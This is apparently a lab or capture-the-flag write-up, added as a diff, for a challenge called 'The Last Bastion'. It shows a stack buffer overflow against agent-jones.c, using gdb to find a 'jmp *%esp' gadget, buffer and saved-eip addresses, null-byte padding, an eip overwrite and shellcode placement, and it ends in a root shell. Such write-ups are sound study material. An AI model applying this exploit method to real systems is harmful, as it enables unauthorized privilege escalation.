@@ -1,0 +1,105 @@
+4. The Last Bastion
+
+Vulnerability: In file agent-jones.c, line 15, there is a magic number 58623 = 0xe4ff. In x86-32 assembly, this binary code means the instruction 'jmp    *%esp' instruction that allows the attacker to jump to esp.
+
+Approach: Simply overwrite eip with the address to the instruction 'jmp    *%esp' and place the shellcode at esp.
+
+Attack:
+
+Step 1. Find the address of 'jmp    *%esp' by typing 'disas magic' in gdb:
+
+Dump of assembler code for function magic:
+   0x08048604 <+0>:	push   %ebp
+   0x08048605 <+1>:	mov    %esp,%ebp
+   0x08048607 <+3>:	mov    0xc(%ebp),%eax
+   0x0804860a <+6>:	shl    $0x3,%eax
+   0x0804860d <+9>:	xor    %eax,0x8(%ebp)
+   0x08048610 <+12>:	mov    0x8(%ebp),%eax
+   0x08048613 <+15>:	shl    $0x3,%eax
+   0x08048616 <+18>:	xor    %eax,0xc(%ebp)
+   0x08048619 <+21>:	orl    $0xe4ff,0x8(%ebp)
+   0x08048620 <+28>:	mov    0xc(%ebp),%ecx
+   0x08048623 <+31>:	mov    $0x3e0f83e1,%edx
+   0x08048628 <+36>:	mov    %ecx,%eax
+   0x0804862a <+38>:	mul    %edx
+   0x0804862c <+40>:	mov    %edx,%eax
+   0x0804862e <+42>:	shr    $0x4,%eax
+   0x08048631 <+45>:	add    %eax,%eax
+   0x08048633 <+47>:	mov    %eax,%edx
+   0x08048635 <+49>:	shl    $0x5,%edx
+   0x08048638 <+52>:	add    %edx,%eax
+   0x0804863a <+54>:	mov    %ecx,%edx
+   0x0804863c <+56>:	sub    %eax,%edx
+   0x0804863e <+58>:	mov    %edx,%eax
+   0x08048640 <+60>:	mov    %eax,0xc(%ebp)
+   0x08048643 <+63>:	mov    0xc(%ebp),%eax
+   0x08048646 <+66>:	mov    0x8(%ebp),%edx
+   0x08048649 <+69>:	and    %edx,%eax
+   0x0804864b <+71>:	pop    %ebp
+   0x0804864c <+72>:	ret    
+End of assembler dump.
+
+Pay attention to the line contain 0xe4ff which is line 0x08048619, estimate the address of 'jmp    *%esp' is 0x0804861c. To confirm, type 'x/i 0x0804861c' to see:
+
+   0x804861c <magic+24>:	jmp    *%esp
+
+Step 2. Find address of 'buf': Use gdb steppping over code lines until after 'buf' is initialized, then type 'print &buf[0]' to get 0xbfffe590.
+
+Step 3. Identify the address of the eip of the previous frame (main frame): Type backtrace to get info about how many frames pushed up so far, type info frame 1 to expect the 'main' frame and see eip = 0x80488cc as below:
+
+Stack frame at 0xbffff960:
+ eip = 0x80488cc in main (agent-jones.c:77); saved eip 0xb7e454d3
+ caller of frame at 0xbffff900
+ source language c.
+ Arglist at 0xbffff958, args: argc=2, argv=0xbffff9f4
+ Locals at 0xbffff958, Previous frame's sp is 0xbffff960
+ Saved registers:
+  ebp at 0xbffff958, eip at 0xbffff95c
+
+This eip is the address of the next instruction to be executed.
+
+Step 3. Find the location of eip: type 'x/1244xw 0xbfffe590' to inspect the memory and find out that the eip lies at 0xbffff8fc. Four last lines look like below:
+
+0xbffff8c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8f0:	0xb7fd2000	0x00000000	0xbffff958	0x080488cc
+                                               ^     ^
+                                               |     |
+                                        0xbffff8fc  eip
+
+From above, 0x080488cc is at the location offset 12 bytes from 0xbffff8f0. So eip is at 0xbffff8fc.
+
+Step 4. Fill 'buf' with nonsense code from 0xbfffe590 to 0xbffff8fc. The best nonsense code is a string of 4972 null character '\x00' to avoid the trick '^ 0x42' in agent-jones.c . At 0xbffff8f, overwrite eip with 0x0804861c (address of 'jmp    *%esp') that points to esp now pointing to the shellcode that just 4 bytes above the eip. To check, type
+
+0xbffff8f0:	0x00000000	0x00000000	0x00000000	0x0804861c  <-- &jmp_esp
+0xbffff900:	0xe3f7db31	0x6a534353	0xb0e18902	0x5b80cd66
+           ^
+           |
+          shellcode starts from here
+
+Result:
+
+jones@pwnable:~$ invoke ./exploit 
+sending exploit...
+connecting to 0wned machine...
+whoami
+root
+cd home/jones
+cat PWNED
+                                                        _______
+        _________   _...._                      _..._   \  ___ `'.
+        \        |.'      '-.         _     _ .'     '.  ' |--.\  \
+         \        .'```'.    '. /\    \\   //.   .-.   . | |    \  '
+          \      |       \     \`\\  //\\ // |  '   '  | | |     |  '
+           |     |        |    |  \`//  \'/  |  |   |  | | |     |  |
+           |      \      /    .    \|   |/   |  |   |  | | |     ' .'
+           |     |\`'-.-'   .'      '        |  |   |  | | |___.' /'
+           |     | '-....-'`                 |  |   |  |/_______.'/
+          .'     '.                          |  |   |  |\_______|/
+        '-----------'                        |  |   |  |
+                                             '--'   '--'
+
+
+
+          Congratulations, you are now r00t and 0wn the b0x!
